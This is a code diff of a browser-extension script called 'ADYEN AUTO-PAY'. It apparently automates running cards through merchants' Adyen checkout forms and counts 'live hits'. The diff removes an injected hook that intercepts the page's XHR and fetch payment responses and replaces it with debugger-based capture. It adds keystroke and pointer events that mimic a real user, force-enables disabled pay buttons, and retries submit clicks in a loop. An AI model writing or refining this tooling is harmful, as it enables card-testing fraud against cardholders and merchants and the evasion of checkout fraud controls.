@@ -12,58 +12,21 @@
   let pendingCard = null;
   let capturedResps = [];
 
-  const HOOK_SRC = `(function(){
-    if (window.__nonohooked) return;
-    window.__nonohooked = true;
-    const isA = function(u){ return /checkoutshopper.*\\/(payments|sessions|submit|result)(\\?|$)/.test(u); };
-    const push = function(d){ try { document.dispatchEvent(new CustomEvent('nonnho-capture', { detail: d })); } catch(e){} };
-    var OX = window.XMLHttpRequest;
-    if (OX) {
-      try {
-        window.XMLHttpRequest = function(){
-          var x = new OX();
-          var o = x.open;
-          x.open = function(m,u){
-            x.__nurl = String(u||'');
-            try { return o.apply(this, arguments); } catch(e){}
-          };
-          x.addEventListener('load', function(){
-            try {
-              if (isA(String(x.__nurl||''))) push({ kind:'xhr', url:x.__nurl, status:x.status, body:x.responseText||'' });
-            } catch(e){}
-          });
-          return x;
-        };
-        window.XMLHttpRequest.prototype = OX.prototype;
-      } catch(e){}
-    }
-    var OF = window.fetch;
-    if (OF) {
-      try {
-        window.fetch = function(input, init){
-          var url = (typeof input === 'string') ? input : (input && input.url ? input.url : '');
-          var p = OF.apply(this, arguments);
-          if (isA(url)) {
-            p.then(function(res){
-              try {
-                var c = res.clone();
-                c.text().then(function(t){ push({ kind:'fetch', url:url, status:res.status, body:t||'' }); }).catch(function(){});;
-              } catch(e){}
-            }).catch(function(){});
-          }
-          return p;
-        };
-      } catch(e){}
-    }
-  })();`;
-
   function injectHook() {
     try {
-      if (window.__nonohooked) return;
-      const s = document.createElement("script");
-      s.textContent = HOOK_SRC;
-      (document.head || document.documentElement).appendChild(s);
-      s.remove();
+      chrome.runtime.sendMessage({ action: "FF_HOOK" }, () => {});
+    } catch (e) {}
+  }
+
+  function attachCapture() {
+    try {
+      chrome.runtime.sendMessage({ action: "DBG_ATTACH" }, () => {});
+    } catch (e) {}
+  }
+
+  function detachCapture() {
+    try {
+      chrome.runtime.sendMessage({ action: "DBG_DETACH" }, () => {});
     } catch (e) {}
   }
 
@@ -84,8 +47,8 @@
       out.refusalCode = j.refusalReasonCode || "";
       out.psp = j.pspReference || "";
       out.action = (j.action && j.action.type) || "";
-      if (!out.resultCode && !out.refusalReason && !out.action) return null;
-      return out;
+      if (out.resultCode || out.refusalReason || out.action) return out;
+      return null;
     } catch (e) {
       return null;
     }
@@ -133,7 +96,9 @@
     const desc = Object.getOwnPropertyDescriptor(proto, "value");
     if (!desc) return;
     desc.set.call(el, "");
-    el.dispatchEvent(new Event("input", { bubbles: true }));
+    try {
+      el.dispatchEvent(new InputEvent("input", { bubbles: true, inputType: "deleteContentBackward" }));
+    } catch (e) {}
     const str = String(value);
     for (let i = 0; i < str.length; i++) {
       const ch = str[i];
@@ -141,12 +106,19 @@
       try {
         el.dispatchEvent(new KeyboardEvent("keydown", { bubbles: true, cancelable: true, key: ch }));
         el.dispatchEvent(new KeyboardEvent("keypress", { bubbles: true, cancelable: true, key: ch }));
+        el.dispatchEvent(new InputEvent("beforeinput", { bubbles: true, cancelable: true, inputType: "insertText", data: ch }));
+        el.dispatchEvent(new InputEvent("input", { bubbles: true, inputType: "insertText", data: ch }));
         el.dispatchEvent(new KeyboardEvent("keyup", { bubbles: true, cancelable: true, key: ch }));
-      } catch (e) {}
-      el.dispatchEvent(new Event("input", { bubbles: true }));
+      } catch (e) {
+        el.dispatchEvent(new Event("input", { bubbles: true }));
+      }
     }
+    try {
+      el.dispatchEvent(new InputEvent("input", { bubbles: true }));
+    } catch (e) {}
     el.dispatchEvent(new Event("change", { bubbles: true }));
     el.dispatchEvent(new Event("blur", { bubbles: true }));
+    el.dispatchEvent(new FocusEvent("focusout", { bubbles: true }));
   }
 
   function classifyField(el) {
@@ -322,6 +294,21 @@
       const txt = JSON.stringify({ url: location.href.slice(0, 140), inputs: inputs, total: document.querySelectorAll("input").length }).slice(0, 3000);
       report("nono_dbg", { tick: dbg.newValue.tick, text: txt });
     }
+
+    const rsp = changes["nono_resp"];
+    if (rsp && rsp.newValue && isTop) {
+      const r = rsp.newValue;
+      if (r.body && r.body.length > 4) {
+        capturedResps.push({ at: Date.now(), url: r.url || "", status: 200, body: String(r.body) });
+        if (capturedResps.length > 60) capturedResps.shift();
+        const info = parseAdyenResp(r.body);
+        if (info) {
+          window.__nonoResult && window.__nonoResult("&#128225;",
+            "RESP " + (info.resultCode || info.action || "?") +
+            (info.refusalReason ? " | " + info.refusalReason : ""), "#c9b8ff");
+        }
+      }
+    }
   });
 
   const observer = new MutationObserver(() => {
@@ -353,6 +340,22 @@
       }
     }
     return false;
+  }
+
+  function fireClick(b) {
+    if (!b) return;
+    try { b.scrollIntoView({ block: "center", behavior: "instant" }); } catch (e) {}
+    try { b.focus({ preventScroll: true }); } catch (e) {}
+    const opts = { bubbles: true, cancelable: true, view: window, button: 0 };
+    ["pointerdown", "mousedown", "pointerup", "mouseup", "click"].forEach((t) => {
+      try {
+        const Ctor = t.indexOf("pointer") === 0 ? PointerEvent : MouseEvent;
+        b.dispatchEvent(new Ctor(t, opts));
+      } catch (e) {
+        try { b.dispatchEvent(new MouseEvent(t, { bubbles: true, cancelable: true })); } catch (e2) {}
+      }
+    });
+    try { b.click(); } catch (e) {}
   }
 
   function findPayButton() {
@@ -429,8 +432,17 @@
     const anyBtn = findPayButton();
     if (anyBtn) {
       if (anyBtn.disabled) anyBtn.disabled = false;
-      try { anyBtn.click(); } catch (e) {}
+      fireClick(anyBtn);
       await sleep(1600);
+      if (isProcessing()) return true;
+    }
+
+    const adyenBtns = Array.from(document.querySelectorAll(".adyen-checkout__button, button[type='submit'], input[type='submit']"));
+    for (const b of adyenBtns) {
+      if (b === anyBtn) continue;
+      if (b.disabled) b.disabled = false;
+      fireClick(b);
+      await sleep(900);
       if (isProcessing()) return true;
     }
 
@@ -453,10 +465,7 @@
     for (let i = 0; i < retries; i++) {
       const btn = findPayButton();
       if (btn) {
-        try {
-          btn.scrollIntoView({ block: "center" });
-        } catch (e) {}
-        btn.click();
+        fireClick(btn);
       }
       await sleep(1300);
       if (isProcessing()) return true;
@@ -526,7 +535,7 @@
         <div style="display:flex;align-items:center;gap:8px">
           <span style="font-size:16px">&#9889;</span>
           <b style="font-size:13px;letter-spacing:.5px">ADYEN AUTO-PAY</b>
-          <span id="nono-ver" style="font-size:9px;background:#00110d33;color:#00110d;padding:2px 6px;border-radius:8px">1.5</span>
+          <span id="nono-ver" style="font-size:9px;background:#00110d33;color:#00110d;padding:2px 6px;border-radius:8px">1.5.1</span>
         </div>
         <div style="display:flex;gap:6px">
           <button id="nono-dbg" title="Debug DOM" style="background:#00110d22;border:none;color:#00110d;cursor:pointer;width:22px;height:22px;border-radius:6px;font-size:10px;line-height:1;font-weight:700">DBG</button>
@@ -724,6 +733,7 @@
     el("#nono-start").addEventListener("click", startHit);
     el("#nono-stop").addEventListener("click", () => {
       stopRequested = true;
+      detachCapture();
       logMsg("Stopped by Chief.");
     });
 
@@ -735,6 +745,8 @@
         return;
       }
       savePanelState();
+      injectHook();
+      attachCapture();
       stopRequested = false;
       tries = 0;
       liveHits = 0;
